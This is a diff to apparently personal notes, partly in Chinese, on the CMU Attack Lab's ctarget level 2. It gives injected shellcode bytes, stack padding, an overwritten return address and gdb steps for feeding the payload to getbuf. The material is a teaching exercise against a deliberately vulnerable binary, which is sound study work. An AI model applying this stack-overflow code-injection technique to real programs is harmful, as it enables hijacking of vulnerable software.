@@ -67,8 +67,7 @@ unix> objdump -d exploit2.o > exploit2.d
 #    c:	c3                   	retq   
 
 # get hex-formatted byte sequencenc as instruction sequence from disassemble file exploit2.d
-48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 
-#（高地址）
+（低地址）48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 （高地址）
 # This string can then be passed through HEX2RAW to generate an input string for the target programs..
 # Alternatively, you can edit example.d to omit extraneous values and to contain C-style comments for readability, 
 # yielding:
@@ -86,7 +85,7 @@ gdb ctarget
 
 ```gdb
 (gdb) b getbuf
-(gdb) run -q
+(gdb) run -q  <raw2.txt
 (gdb) disas
 (gdb) n
 (gdb) p $rsp 
@@ -99,14 +98,15 @@ rsp            0x5561dc78          0x5561dc78
 low address:  78 dc 61 55
 
 
-4. edit the exploit2_.d
-
+4. add the exploit2_.d with the rsp address to exploit2_.d
+(低地址)
 48 c7 c7 fa 97 b9 59 68 
 ec 17 40 00 c3 00 00 00 
 00 00 00 00 00 00 00 00                  	
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
-78 dc 61 55 00 00 00 00
+78 dc 61 55 00 00 00 00 (高地址)
+
 
 getbuf stack frame should be:
 00 00 00 55 61 dc 78    -> rsp 地址       
